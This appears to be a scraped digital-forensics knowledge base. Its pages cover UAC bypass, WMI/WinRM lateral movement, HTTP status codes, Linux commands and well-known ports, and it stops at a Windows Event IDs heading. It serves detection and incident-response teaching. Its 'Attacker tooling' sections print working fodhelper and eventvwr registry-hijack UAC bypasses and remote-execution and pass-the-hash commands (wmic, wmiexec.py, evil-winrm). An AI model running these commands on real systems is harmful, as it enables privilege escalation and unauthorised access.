docs.text:
• MITRE ATT&CK — T1134
  • itm4n — PrintSpoofer: abusing impersonation privileges
  • Pages: UAC bypass · Web shell playbook · PrintNightmare & Spooler

docs.title: UAC Bypass
docs.text:
MITRE ATT&CK: T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control) · Tactic: Privilege Escalation / Defense Evasion · Last updated: 2026-10-07

Summary

When a member of the local Administrators group logs on (Vista and later), Windows gives them a filtered, medium-integrity token; running something "as administrator" needs a UAC prompt to switch to the high-integrity token. Some signed Windows binaries are marked auto-elevate — they get the high token with no prompt at the default UAC level. A UAC bypass makes one of those auto-elevating binaries run the attacker's command, usually by planting a value in a per-user (HKCU) registry key the binary reads. Result: admin-level code from a non-prompting, already-admin user. Microsoft does not treat UAC as a security boundary, so many bypasses stay unpatched for years.

docs.title: How the attack works
docs.text:
sequenceDiagram
    participant M as Malware (medium integrity, user is local admin)
    participant R as HKCU registry
    participant F as fodhelper.exe (auto-elevate)
    participant C as cmd.exe
    M->>R: write HKCU\Software\Classes\ms-settings\shell\open\command<br/>(Default)=payload, DelegateExecute=""
    M->>F: start fodhelper.exe
    F->>F: elevates silently (high integrity)
    F->>R: looks up ms-settings handler — HKCU wins over HKLM
    F->>C: launches payload as HIGH integrity
    M->>R: delete the key (cleanup)

Common families: registry handler hijack (fodhelper, computerdefaults, eventvwr via mscfile, sdclt), environment variable / path hijack (%windir% redirection for scheduled tasks like SilentCleanup), DLL hijack of auto-elevated binaries, and elevated COM interfaces (ICMLuaUtil). The open-source UACME project catalogues 70+ methods and the Windows builds each works on.

docs.title: Attacker tooling / commands
docs.text:
# fodhelper (Windows 10/11) — what the registry write looks like
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Users\Public\p.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f
fodhelper.exe

# eventvwr (Windows 7 – early 10)
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# Frameworks
UACME (Akagi64.exe <method#>) · Metasploit bypassuac_* · Cobalt Strike elevate uac-token-duplication

docs.title: Affected Windows versions
docs.text: Version UAC? Notes XP / 2003 No UAC Users typically ran as full admin — no bypass needed; privilege escalation used kernel/service exploits instead Vista / 2008 Yes — but prompts for everything, few auto-elevate binaries Bypass less common 7 / 2008 R2 Yes — introduced auto-elevation and the slider (default "Notify only when apps try to make changes") eventvwr, sdclt, DLL-hijack bypasses widely used 8.1 / 10 Yes fodhelper (10+), computerdefaults, SilentCleanup env-var hijack; eventvwr fixed in 10 1703 11 Yes Most registry-hijack methods still work at the default level. Administrator protection (just-in-time admin token behind Windows Hello, rolling out in recent 11 builds) breaks the auto-elevate model where enabled Server Yes, but the built-in Administrator (RID 500) is exempt by default (FilterAdministratorToken=0) On servers, attackers often already have a full token

docs.title: Artifacts left behind
docs.text: Where Artifact What to look for Sysmon 12/13 (registry key create / value set) under HKCU\Software\Classes\<ms-settings, mscfile, exefile, Folder>\shell\open\command or HKCU\Environment\windir The hijack itself — almost never legitimate Sysmon / 4688 1 — ParentImage is fodhelper.exe, computerdefaults.exe, eventvwr.exe, sdclt.exe, wsreset.exe, slui.exe, changepk.exe and child is a shell/LOLBin/unsigned exe The payload starting under an auto-elevated parent Sysmon 1 / 4688 IntegrityLevel=High for a process whose parent chain started at Medium without a consent.exe in between Elevation without a prompt Registry (offline) NTUSER.DAT Software\Classes\...\shell\open\command — key LastWrite time even if the value was deleted Timeline evidence Security log 4688 Token_Elevation_Type = %%1937 (TokenElevationTypeFull) for the payload Type 2 = full token

docs.title: Detection
docs.text:
Splunk — registry hijackSplunk — auto-elevate parent → shell 
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID IN (12,13)
| where match(TargetObject,"(?i)\\\\Software\\\\Classes\\\\(ms-settings|mscfile|exefile|folder|launcher\.systemsettings)\\\\shell\\\\open\\\\command|\\\\Environment\\\\windir")
| table _time, host, User, Image, EventType, TargetObject, Details

Sysmon 12 = registry key created/deleted; 13 = registry value set. TargetObject is the full key path, Details the value written. The regex covers the handler keys used by the common bypasses plus the windir environment hijack.

index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
| eval parent=lower(replace(ParentImage,".*\\\\",""))
| where parent IN ("fodhelper.exe","computerdefaults.exe","eventvwr.exe","sdclt.exe","wsreset.exe","slui.exe","changepk.exe")
| where NOT like(lower(Image),"%\\mmc.exe")
| table _time, host, User, parent, Image, CommandLine, IntegrityLevel

replace(ParentImage,".*\\\\","") strips the folder, leaving the file name. eventvwr.exe normally starts mmc.exe, so that is excluded; anything else spawned by these binaries is suspicious.

docs.title: Response
docs.text: A UAC bypass means the user account is already a local admin and the attacker now has high integrity — scope the host as fully compromised (credential dumping usually follows). Remove the registry key, collect the payload, and check whether the same user is admin on other machines.

docs.title: Remediation by Windows version
docs.text: Control What it stops Available on Users are not local admins; separate admin accounts Removes the precondition for every UAC bypass All versions (XP: the only real control) UAC level Always notify (ConsentPromptBehaviorAdmin=2) Disables silent auto-elevation — blocks most registry-hijack bypasses Vista+ (7+ has the slider) Prompt for credentials on the secure desktop (ConsentPromptBehaviorAdmin=1) Admin must type a password — even stronger Vista+ FilterAdministratorToken=1 (Admin Approval Mode for RID 500) Built-in Administrator also gets a filtered token Vista+ (important on Servers) Administrator protection Isolated, just-in-time admin token Recent Windows 11 builds where enabled WDAC / AppLocker on user-writable paths Payload in %TEMP% / Public cannot run even if elevated AppLocker 7 Ent+; WDAC 10+ Sysmon registry monitoring rules for the keys above Detection Sysmon on 10 / 2012 R2+ (older builds on 7)

docs.title: References
docs.text:
• MITRE ATT&CK — T1548.002
  • UACME — catalogue of methods and fixed-in builds
  • Pages: Token impersonation & Potato · Registry keys · Windows Event IDs

docs.title: WMI & WinRM Execution
docs.text:
MITRE ATT&CK: T1047 (Windows Management Instrumentation) + T1021.006 (Windows Remote Management) · Tactic: Execution / Lateral Movement · Last updated: 2026-09-17

Summary

WMI and WinRM are built-in remote-management channels. WMI (over DCOM, port 135 + dynamic RPC) lets an attacker spawn a process on a remote host via Win32_Process.Create — no binary dropped, execution appears under wmiprvse.exe. WinRM/PowerShell Remoting (WSMan over HTTP 5985 / HTTPS 5986) runs commands under wsmprovhost.exe. Both are "fileless" lateral movement that blends into legitimate admin traffic.

docs.title: How the attack works
docs.text:
sequenceDiagram
    participant A as Attacker (Host1)
    participant T as Target (Host2)
    Note over A,T: WMI path
    A->>T: DCOM 135 + dynamic RPC — Win32_Process.Create("powershell ...")
    T->>T: wmiprvse.exe spawns the command
    Note over A,T: WinRM path
    A->>T: WSMan 5985/5986 — Invoke-Command / Enter-PSSession
    T->>T: wsmprovhost.exe runs the scriptblock

Neither drops a service binary (unlike PsExec), so the file-system trail is thin — the evidence is the parent process on the target and the auth/protocol logs.

docs.title: Attacker tooling / commands
docs.text:
# WMI
wmic /node:HOST2 /user:CORP\admin process call create "powershell -enc <b64>"
Invoke-WmiMethod -ComputerName HOST2 -Class Win32_Process -Name Create -ArgumentList "cmd /c ..."
wmiexec.py CORP/admin@10.0.0.5 -hashes :<hash>       # Impacket
# Cobalt Strike:  jump winrm / remote-exec wmi

# WinRM / PS Remoting
Invoke-Command -ComputerName HOST2 -ScriptBlock { whoami }
Enter-PSSession -ComputerName HOST2
evil-winrm -i 10.0.0.5 -u admin -H <hash>            # PtH over WinRM

docs.title: Artifacts left behind
docs.text:
Where Artifact What to look for Target Sysmon 1 with ParentImage = ...\wmiprvse.exe (WMI) or ...\wsmprovhost.exe (WinRM) These parents spawning cmd/powershell/anything = remote exec Target Security log 4624 Logon Type 3 (both), the account used Inbound network logon Target WinRM channel Microsoft-Windows-WinRM/Operational 91 (session created), 168 (authenticating user) WinRM server-side Target WMI channel Microsoft-Windows-WMI-Activity/Operational 5857–5861 WMI provider load / operation; 5861 = new permanent consumer (persistence, not just exec) Target PowerShell 4104 (script block), 400 (engine start with HostApplication) What was actually run Target host Prefetch WMIPRVSE.EXE/WSMPROVHOST.EXE; 4688 with those parents Execution evidence Source host 4648 (explicit creds), Sysmon 1 for wmic.exe/Invoke-Command, PowerShell history Origin Network Zeek conn.log internal→internal 135+dynamic (WMI) or 5985/5986 (WinRM); dce_rpc.log for IWbemServices; WinRM shows as http/ssl on 5985/5986 Protocol footprint

wmiprvse/wsmprovhost are normal — the child is the tell

wmiprvse.exe and wsmprovhost.exe run legitimately all the time. The anomaly is what they spawn: an interactive shell, an encoded PowerShell, a discovery command (whoami, net, nltest), or anything writing to disk. Baseline normal WMI/WinRM parents so those stand out.

docs.title: Detection
docs.text:
Splunk — remote-exec by parentSplunk — WMI persistence (event consumers)Zeek — WinRM & WMI on the wire 
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
    (ParentImage="*\\wmiprvse.exe" OR ParentImage="*\\wsmprovhost.exe")
| eval method=if(match(ParentImage,"wmiprvse"),"WMI","WinRM")
| table _time, host, method, User, ParentImage, Image, CommandLine
| sort 0 _time

Sysmon 1 = process create. Filtering on the two remote-management parents surfaces every process launched via WMI or WinRM on the target; method labels which channel. In a clean environment most of these are benign management tools — read Image/CommandLine and flag shells, encoded PowerShell, and discovery.

index=botsv3 (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID IN (19,20,21))
| eval kind=case(EventID==19,"WMI Filter",EventID==20,"WMI Consumer",EventID==21,"WMI Binding")
| table _time, host, kind, User, Operation, EventNamespace, Name, Query, Destination
| sort 0 _time

Sysmon 19 (event filter), 20 (event consumer), 21 (filter-to-consumer binding) together are the classic fileless WMI persistence — a filter (e.g. "on system startup") bound to a consumer that runs a script. Any 20/21 outside change windows deserves scrutiny.

# WinRM (5985/5986) internal->internal
zeek-cut -d ts id.orig_h id.resp_h id.resp_p service < conn.log | awk '($4==5985 || $4==5986) && $2 ~ /^10\./ && $3 ~ /^10\./'
# WMI: DCE-RPC IWbemServices
zeek-cut -d ts id.orig_h id.resp_h operation < dce_rpc.log | grep -iE 'IWbemServices|ExecMethod'

WinRM is HTTP(S) on 5985/5986 — easy to spot internal→internal. WMI rides DCOM/RPC; dce_rpc.log records the IWbemServices/ExecMethod operations that back Win32_Process.Create.

docs.title: Response
docs.text: Isolate the target, rotate the account used, and hunt every host where that account made a type-3 logon. Because there's no dropped binary, the durable evidence is the parent-process relationship and the WinRM/WMI operational logs — collect those plus PowerShell 4104. If Sysmon 19/20/21 show WMI persistence, remove the filter/consumer/binding (Get-WmiObject -Namespace root\subscription -Class __EventFilter etc.) and check other hosts for the same subscription. Harden: restrict WinRM to management subnets and jump hosts, enable PowerShell script-block logging fleet-wide, deploy Sysmon with WMI-subscription and suspicious-parent rules, disable WMI/WinRM where not needed, and tier admin accounts.

docs.title: HTTP Status Codes
docs.text:
Category: basics · Last updated: 2026-09-09

In one sentence

The first digit tells you the class; in log analysis the pattern of codes (bursts of 401/403/404, a lonely 200 after hundreds of 404s) often matters more than any single code.

docs.title: Classes
docs.text: Class Meaning Analyst's read 1xx Informational Rare in logs. 101 = WebSocket upgrade (C2 over WebSockets exists) 2xx Success Request worked. A 200 to a weird path = the thing exists 3xx Redirection Follow the Location header. Redirect chains are classic in phishing / malvertising 4xx Client error Scanning, brute force, broken bots 5xx Server error Crash, misconfig, or a successful exploit blowing up the app

docs.title: The ones you will actually see
docs.text: Code Name DFIR notes 200 OK Normal. Watch response size — a 200 with 0 bytes or an unusual fixed size can be a C2 heartbeat 201 Created Upload succeeded (WebDAV PUT, API) 204 No Content Common for beacon/telemetry check-ins 206 Partial Content Range requests — media streaming, but also chunked exfil/download 301 Moved Permanently 302 Found (temporary redirect) Login flows, phishing redirectors, ad networks 304 Not Modified Cached; client already had it 307 / 308 Temporary / Permanent redirect (method preserved) 400 Bad Request Malformed request — fuzzing, exploit attempts, broken tooling 401 Unauthorized Auth required / failed. Bursts = credential brute force (Basic/NTLM) 403 Forbidden Authenticated but not allowed, or WAF block. Dir-busting shows as many 403/404 404 Not Found Hundreds in a row from one IP = directory brute force (gobuster, dirb, feroxbuster) 405 Method Not Allowed e.g. PUT to a server that does not allow it — probing for upload 407 Proxy Authentication Required Corporate proxy. Malware that cannot do proxy auth stalls here 408 Request Timeout 413 Payload Too Large Upload attempt bigger than allowed 418 I'm a teapot RFC 2324. If you see this, someone is having fun 429 Too Many Requests Rate limiting kicked in — someone was hammering 500 Internal Server Error App crashed. After a suspicious request → possible exploit 501 Not Implemented 502 Bad Gateway Reverse proxy could not reach the backend 503 Service Unavailable Overload / maintenance / DoS 504 Gateway Timeout

docs.title: Patterns worth alerting on
docs.text: Pattern Likely meaning One source, many 404 in seconds, varied paths Directory / file brute force One source, many 401 to the same path Password spraying / brute force 200 to /wp-login.php, /admin, /.git/, /.env Exposed sensitive resource — check what was returned PUT/POST → 201 then GET same path → 200 Web shell upload and first use Regular-interval GET with identical small 200 Beaconing (check jitter, User-Agent, URI entropy) 500 immediately after a request containing ', ../, ${jndi:, <script Exploit attempt that hit something

docs.title: Looking these up quickly
docs.text:
Zeek http.logSplunkApache / Nginx access log 
# status code distribution per source
zeek-cut id.orig_h status_code < http.log | sort | uniq -c | sort -rn | head

index=web sourcetype=access_combined
| stats count by clientip, status
| where status>=400
| sort - count

awk '{print $9}' access.log | sort | uniq -c | sort -rn

docs.title: Essential Linux Commands
docs.text:
Category: basics · Focus: commands a DFIR analyst uses daily · Last updated: 2026-09-17

In one sentence

From the true basics — creating, copying, moving and deleting files and folders, editing, redirection — through the commands that come up over and over in an investigation: navigating, searching, piping, inspecting processes and the network, and handling evidence safely. Each with a worked example and the flags that matter. For the investigative use of these (which log answers which question), see the Linux forensics section.

docs.title: Command anatomy
docs.text:
A command is program [options] [arguments]. Options (flags) start with - (short, -l) or -- (long, --all); short flags combine (ls -la = ls -l -a). Some take a value (-p 2222, --output=file). Arguments are what it acts on (files, paths).

ls -la /var/log        # program=ls, options=-la, argument=/var/log

Everyday keys: Tab auto-completes names, Ctrl+C stops a running command, Ctrl+R searches your command history, Up/Down scroll previous commands, clear (or Ctrl+L) clears the screen. history lists what you've typed; !! re-runs the last command (sudo !! re-runs it as root).

Paths: / is the root, . is here, .. is the parent, ~ is your home, and a leading / means absolute (/etc/passwd) versus relative (logs/auth.log).

docs.title: Navigating & looking around
docs.text:
Command Does Example pwd Print working directory pwd → /var/log ls List files ls -la (all, long) · ls -lat (newest first) · ls -laR (recursive) · ls -li (inode) cd Change directory cd /var/log · cd - (previous) · cd (home) tree Directory as a tree tree -a -L 2 /etc (all files, 2 levels deep) stat File metadata + timestamps stat auth.log (shows M/A/C, and Birth if supported) file Identify a file by content file /tmp/x → ELF 64-bit executable (a "PNG" that's really an ELF = suspicious) du / df Disk used by files / by filesystem du -sh /var/log/* (size per item) · df -h (free space) 
# Newest files in a directory (recently touched = interesting during an incident)
ls -lat --time-style=full-iso /tmp | head
# Long listing explained: -l long, -a hidden(dot) files, -t sort by mtime, --time-style full timestamp

ls -la is the one you'll type most. Columns: permissions, link count, owner, group, size, mtime, name. A leading . in the name = hidden file (attackers love . names).

docs.title: Creating files & folders
docs.text:
Command Does Example mkdir Make a directory mkdir cases · mkdir -p cases/2026/incident1 (-p makes parents too) touch Create an empty file, or update its timestamp touch notes.txt · touch a.txt b.txt c.txt (several at once) echo > Write text into a new file echo "first line" > notes.txt printf > Like echo, precise formatting printf "a\nb\n" > list.txt cat > Type content into a file (end with Ctrl+D) cat > notes.txt then type, then Ctrl+D tee Write to a file and the screen echo hi \| tee notes.txt 
# Make a nested folder structure in one go
mkdir -p cases/incident-2026-0917/{collected,parsed,report}
#   -p creates every level; {a,b,c} expands to three siblings → creates all four dirs at once

# Create an empty file (or refresh its modification time if it exists)
touch cases/incident-2026-0917/report/notes.md

# Create a file with initial content
echo "# Incident notes" > cases/incident-2026-0917/report/notes.md

> overwrites, >> appends

echo "x" > file replaces the file's whole content (and creates it if absent). echo "x" >> file adds to the end. Mixing these up silently wipes a file — when in doubt, use >>.

docs.title: Copying, moving, renaming & deleting
docs.text:
Command Does Example cp Copy a file cp a.txt b.txt · cp -r dir/ backup/ (recursive, for folders) · cp -a (preserve all metadata) mv Move or rename (same command) mv old.txt new.txt (rename) · mv file.txt /tmp/ (move) rm Delete a file rm file.txt · rm -r dir/ (recursive) · rm -i file (ask first) rmdir Delete an empty directory rmdir emptydir ln -s Create a symbolic link (shortcut) ln -s /var/log/auth.log here.log 
# Copy a whole folder, keeping timestamps/permissions (use -a for evidence)
cp -a /var/log/ ./log-backup/

# Rename is just "move to a new name in the same folder"
mv report-draft.md report-final.md

# Move several files into a directory
mv *.log logs/

# Delete — there is no recycle bin, deletion is immediate
rm scratch.txt
rm -r old-case/          # -r removes a directory and everything inside

rm is permanent — no undo, no trash

There is no recycle bin on the command line. rm -rf deletes a directory tree instantly and irreversibly, and rm -rf / (or a stray space, rm -rf / tmp) can wipe the system. Habits that save you: use rm -i (prompts before each delete), double-check the path before pressing Enter, and never run rm -rf with a variable path (rm -rf "$DIR/") without confirming $DIR is set. On evidence, don't delete — move to a quarantine folder instead (mv suspect /quarantine/).

docs.title: Editing files
docs.text:
Two editors are on almost every system. nano is the beginner-friendly one:

nano notes.txt
#   Ctrl+O then Enter = save (write Out) ; Ctrl+X = exit ; Ctrl+W = search ; Ctrl+K = cut line

vim is everywhere and worth knowing the survival subset (you will land in it by accident):

vim notes.txt
#   i        enter insert mode (now you can type)
#   Esc      leave insert mode (back to command mode)
#   :w       save        :q   quit        :wq  save & quit        :q!  quit WITHOUT saving
#   /word    search      dd   delete line      u   undo

For quick edits without opening an editor, sed does find-and-replace in place:

sed -i 's/old/new/g' file.txt      # -i edits the file directly; s/old/new/g replaces all occurrences

docs.title: Reading files
docs.text:
Command Does Example cat Dump whole file cat /etc/passwd less Page through (searchable) less /var/log/auth.log — /pattern search, q quit, G end, g top head / tail First / last N lines head -50 file · tail -100 file · tail -f file (follow live) nl Number lines nl script.sh strings Printable strings from a binary/blob strings -a malware.bin \| grep -iE "http\|cmd\|\.dll" xxd / hexdump Hex view xxd file \| head · xxd -s 0 -l 64 file (offset 0, 64 bytes) zcat / zless / zgrep Read gzipped logs without unzipping zgrep "Failed" /var/log/auth.log.*.gz 
# Follow a log live during response (Ctrl+C to stop)
tail -f /var/log/auth.log
# Read a rotated, compressed log
zcat /var/log/syslog.2.gz | tail -50

On evidence, prefer read-only tools

cat/less/grep read without modifying, but they update the file's atime (access time) on a live system. When examining evidence, work on a copy or a read-only mount so you don't disturb timestamps — and remember atime is often disabled anyway (timestamps).

docs.title: Searching — grep, find, and friends
docs.text:
grep (search text) and find (search the filesystem) are the two you cannot do without.

# grep: search inside files
grep "Failed password" auth.log            # lines containing the phrase
grep -i "error" log                         # -i case-insensitive
grep -r "password" /etc/                     # -r recursive through a directory
grep -n "root" /etc/passwd                   # -n show line numbers
grep -v "^#" sshd_config                     # -v invert: lines NOT matching (drop comments)
grep -c "Accepted" auth.log                  # -c count matches
grep -E "Failed|Invalid" auth.log            # -E extended regex (OR)
grep -A3 -B1 "segfault" kern.log             # -A/-B lines After/Before context
grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" access.log   # -o only the match (extract IPs)

# find: locate files by criteria
find /home -name "*.sh"                       # by name
find / -type f -newermt "2026-08-20" 2>/dev/null   # modified after a date
find / -perm -4000 -type f 2>/dev/null        # setuid binaries (privilege persistence)
find /tmp -type f -mmin -60                    # modified in the last 60 minutes
find / -user www-data -type f 2>/dev/null      # owned by a user
find . -size +100M                             # larger than 100 MB (staged archives?)
find / -xdev -name ".*" -type f 2>/dev/null    # hidden files, stay on one filesystem

2>/dev/null throws away the "permission denied" noise so you see only results. -xdev keeps find from wandering into /proc, /sys, or network mounts.

Related: awk (field processing), sed (stream edit), sort, uniq, cut, wc — covered under pipes below.

docs.title: Redirection & chaining
docs.text:
Every command has three streams: stdin (input), stdout (normal output), stderr (errors). You redirect them with these operators:

Operator Does Example > stdout → file (overwrite) ls > files.txt >> stdout → file (append) echo done >> log.txt 2> stderr → file find / 2> errors.txt 2>/dev/null discard errors find / -name x 2>/dev/null (hide "permission denied") &> both stdout+stderr → file command &> all.txt < file → stdin sort < names.txt \| stdout of one → stdin of next (a "pipe") ps aux \| grep ssh

Chaining commands on one line:

Operator Does Example ; run in sequence regardless cd /tmp ; ls && run next only if previous succeeded mkdir out && cd out \|\| run next only if previous failed ping -c1 host \|\| echo "down" & run in the background long-job & 
# Save results and errors separately
find / -name "*.conf" > found.txt 2> denied.txt
# Only continue if the first step worked
tar czf backup.tgz /data && echo "backup ok"

docs.title: Pipes & text processing — the real power
docs.text:
The pipe | sends one command's output into the next. This is how you turn a raw log into an answer.

# Top 10 source IPs of failed SSH logins
grep "Failed password" auth.log \
  | grep -oE "from [0-9.]+" \
  | awk '{print $2}' \
  | sort | uniq -c | sort -rn | head

Reading it: grep finds the failure lines → grep -oE extracts from <IP> → awk '{print $2}' prints the second word (the IP) → sort groups identical IPs together → uniq -c collapses duplicates and counts them → sort -rn sorts by that count, highest first → head shows the top 10. The result is a ranked brute-force source list.

The building blocks:

Command Does Example awk Field-based processing awk -F: '{print $1}' /etc/passwd (first field, :-separated) sed Find/replace, edit stream sed 's/old/new/g' file · sed -n '10,20p' file (lines 10–20) sort Order lines sort -rn (reverse numeric) · sort -u (unique) · sort -t: -k3 -n (by 3rd : field) uniq Collapse adjacent duplicates uniq -c (count) — must sort first cut Extract columns cut -d: -f1,3 /etc/passwd (fields 1 and 3) wc Count wc -l file (lines) · wc -c (bytes) tr Translate/delete chars tr 'A-Z' 'a-z' · tr -d '\0' (strip nulls) · tr '\0' '\n' tee Write to file and screen ... | tee out.txt xargs Turn input into arguments find . -name "*.log" | xargs grep "error" 
# awk is a mini-language: filter + compute
awk -F: '$3 == 0 {print $1}' /etc/passwd        # users with UID 0 (should be only root)
awk -F: '$3 >= 1000 {print $1}' /etc/passwd      # regular (human) accounts
awk '{sum+=$1} END {print sum}' numbers          # sum a column
awk '$9 == 404 {print $7}' access.log            # requested paths that returned 404

# Unique-and-count pattern (memorise this one)
cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head   # top client IPs in a web log

docs.title: Processes & the network
docs.text:
Command Does Example ps Process snapshot ps auxfww (all, full, forest/tree) · ps -eo pid,ppid,user,cmd top / htop Live process view top — P sort by CPU, M by memory, q quit ss Sockets/connections ss -tunap (TCP+UDP, numeric, all, process) · ss -tlnp (listening) lsof Open files/sockets lsof -nP -iTCP -sTCP:LISTEN (listening ports) · lsof +L1 (deleted-but-open) kill Signal a process kill -9 <pid> (force) — capture evidence first pgrep / pkill Find/kill by name pgrep -a nginx (list with args) 
# Full process tree with command lines (read this to spot bad parent→child)
ps auxfww
# Network connections with the owning process — the key pivot in live response
ss -tunap
# What is listening (backdoor listeners show here)
ss -tlnp
# A process's details via /proc
cat /proc/<pid>/cmdline | tr '\0' ' '; echo      # full command line
readlink /proc/<pid>/exe                          # the actual binary (may say "(deleted)")

See Linux logs & triage for how to read these during an incident.

docs.title: Permissions & ownership
docs.text:
ls -l file            # -rwxr-xr-- : owner rwx, group r-x, others r--
chmod 640 file        # rw- r-- --- (owner read/write, group read, others none)
chmod +x script.sh    # add execute
chown user:group file # change owner and group
id                    # your uid/gid/groups
sudo -l               # what you're allowed to run as root
lsattr file           # extended attrs — 'i' = immutable (attacker anti-delete trick)
chattr -i file        # remove immutable so you can delete/quarantine

Permission notation: three groups of rwx (owner, group, others). Numeric: r=4, w=2, x=1 summed per group, so 750 = rwxr-x---. A world-writable file (chmod 777) or an unexpected setuid bit (s in the owner-execute slot) is worth a second look.

docs.title: Handling evidence safely
docs.text:
# Hash a file (integrity — do this to every piece of evidence)
sha256sum evidence.raw > evidence.raw.sha256
sha256sum -c evidence.raw.sha256                  # verify later (prints OK/FAILED)
md5sum file                                        # legacy tools still want md5

# Copy preserving all metadata (timestamps, perms, owner)
cp -a source dest                                  # -a = archive (preserve everything)
rsync -a --progress src/ dest/                     # large trees, resumable

# Mount a disk image read-only (never write to evidence)
mount -o ro,loop,noexec image.dd /mnt/evidence
mount -o ro,loop,offset=$((2048*512)) image.dd /mnt/evidence   # partition at sector 2048

# Compress/extract collections
tar czf triage.tar.gz /path/to/collect            # create gzip archive
tar xzf triage.tar.gz                              # extract
gzip -d file.gz ; zcat file.gz                     # single-file gzip

Hash before and after, mount read-only

Every evidence file gets a SHA-256 before you touch it and again after, and they must match — that's how you prove it didn't change (imaging & collection). Always mount images ro (read-only); a stray write destroys evidence and breaks the hash.

docs.title: SSH & remote work
docs.text:
ssh user@host                                      # connect
ssh -i key.pem user@host                            # with a specific key
ssh -p 2222 user@host                               # non-standard port
scp file user@host:/path/                           # copy a file over SSH
scp -r dir user@host:/path/                          # recursive
scp user@host:/var/log/auth.log ./                  # pull a log from a remote box
sftp user@host                                       # interactive file transfer
# Check what keys grant access to an account you're investigating
cat ~/.ssh/authorized_keys

docs.title: Getting help
docs.text:
man ss              # full manual (q to quit, /pattern to search)
ss --help           # quick option summary
tldr find           # community examples (if tldr installed) — faster than man
which volatility3   # where is this binary?
apropos network     # find commands related to a keyword
type -a ls          # is it a binary, alias, or function?

docs.title: The commands you'll actually reach for first
docs.text:
In a live-response moment, this handful covers most of it:

w; who -a                                    # who's logged in now
ps auxfww                                     # what's running
ss -tunap                                     # what's connected / listening
ls -lat /tmp /dev/shm /var/tmp | head         # recent drops
grep -Ei "accepted|failed|sudo" /var/log/auth.log | tail   # recent auth
find / -xdev -mmin -120 -type f 2>/dev/null | head    # changed in last 2 hours

docs.title: Well-Known Ports
docs.text:
Category: basics · Last updated: 2026-09-09

In one sentence

Port numbers hint at the service — but attackers know that too, so always confirm with protocol analysis (Zeek service field, Wireshark dissector) rather than trusting the port alone.

docs.title: Ranges
docs.text: Range Name Notes 0 – 1023 Well-known / system Usually needs root/admin to bind 1024 – 49151 Registered Vendor-registered with IANA 49152 – 65535 Dynamic / ephemeral Client-side source ports. Windows uses 49152–65535, older Linux 32768–60999

docs.title: Core services
docs.text: Port Proto Service DFIR notes 20 / 21 TCP FTP data / control Cleartext creds. Passive mode uses high ports 22 TCP SSH Also SFTP/SCP. Check auth.log for brute force 23 TCP Telnet Cleartext; still common on IoT/OT 25 TCP SMTP Server-to-server mail. Spam/phish source 53 UDP/TCP DNS TCP for large responses/zone transfers. Watch for tunnelling (long TXT, high entropy subdomains) 67 / 68 UDP DHCP server / client Ties IP ↔ MAC ↔ hostname over time 69 UDP TFTP No auth. Used for firmware, malware staging 80 TCP HTTP Cleartext web 88 TCP/UDP Kerberos Domain auth. Kerberoasting shows as TGS-REQ with RC4 (etype 23) 110 TCP POP3 Legacy mail retrieval 111 TCP/UDP RPCbind / portmapper NFS discovery 123 UDP NTP Time sync — matters for timeline correlation 135 TCP MS-RPC endpoint mapper WMI, DCOM, PsExec-style lateral movement 137 / 138 UDP NetBIOS name / datagram Legacy name resolution; LLMNR/NBT-NS poisoning 139 TCP NetBIOS session (SMB over NetBIOS) Legacy SMB 143 TCP IMAP Mail retrieval 161 / 162 UDP SNMP / traps public community string = free recon 389 TCP/UDP LDAP AD queries. BloodHound-style enumeration is heavy 389 traffic 443 TCP HTTPS Also QUIC on UDP 443. Use JA3/JA4, SNI, cert details 445 TCP SMB (direct) File shares, PsExec, lateral movement, ransomware spread 464 TCP/UDP Kerberos password change 465 / 587 TCP SMTPS / SMTP submission Client mail sending 514 UDP Syslog Cleartext; TCP 6514 for TLS 515 TCP LPD printing 548 TCP AFP macOS file sharing 587 TCP SMTP submission Authenticated client mail 636 TCP LDAPS 993 / 995 TCP IMAPS / POP3S 1433 / 1434 TCP / UDP MS SQL Server / browser 1521 TCP Oracle DB 1723 TCP PPTP VPN Weak; also GRE (proto 47) 2049 TCP/UDP NFS 3268 / 3269 TCP LDAP Global Catalog / GC-SSL 3306 TCP MySQL / MariaDB 3389 TCP/UDP RDP Brute force, lateral movement. Correlate with 4624 type 10, 4778/4779, TerminalServices logs 5060 / 5061 UDP/TCP SIP / SIP-TLS VoIP 5432 TCP PostgreSQL 5900+ TCP VNC Often weak/no auth 5985 / 5986 TCP WinRM HTTP / HTTPS PowerShell Remoting. Event 4688 wsmprovhost.exe on target 6379 TCP Redis Frequently exposed with no auth 8080 / 8443 TCP HTTP alt / HTTPS alt Proxies, dev servers, C2 9200 / 9300 TCP Elasticsearch 27017 TCP MongoDB

docs.title: Ports attackers love (default C2 / tooling)
docs.text:
These are defaults — anything can be reconfigured. Treat as "worth a look", not proof.

Port Associated with 4444 Metasploit default listener 1080 SOCKS proxy (Chisel, ssh -D, Cobalt Strike SOCKS) 50050 Cobalt Strike team server (operator ↔ server, not beacon) 8443 / 443 / 80 Most modern C2 (Cobalt Strike, Sliver, Mythic, Havoc) blend in here 8000 / 8080 Python http.server, staging servers 3128 Squid proxy 5555 Android ADB 6667 / 6697 IRC (old-school botnets) 31337 Back Orifice / "elite" — nostalgia, still seen in CTFs

docs.title: IP protocol numbers (not ports, but often confused)
docs.text: Number Protocol 1 ICMP 2 IGMP 6 TCP 17 UDP 41 IPv6 encapsulation 47 GRE 50 ESP (IPsec) 51 AH (IPsec) 58 ICMPv6 89 OSPF 132 SCTP

docs.title: Quick lookups
docs.text:
LinuxWindowsZeek 
grep -w 445 /etc/services
ss -tulpn            # what is listening now

Get-NetTCPConnection -State Listen | Sort-Object LocalPort
netstat -anob        # -b shows the owning binary (admin)

# Which services were actually seen on port 443? (should be ssl; anything else is odd)
zeek-cut id.resp_p service < conn.log | awk '$1==443' | sort | uniq -c | sort -rn

docs.title: Windows Event IDs
docs.text:
Category: basics · Last updated: 2026-09-09

In one sentence

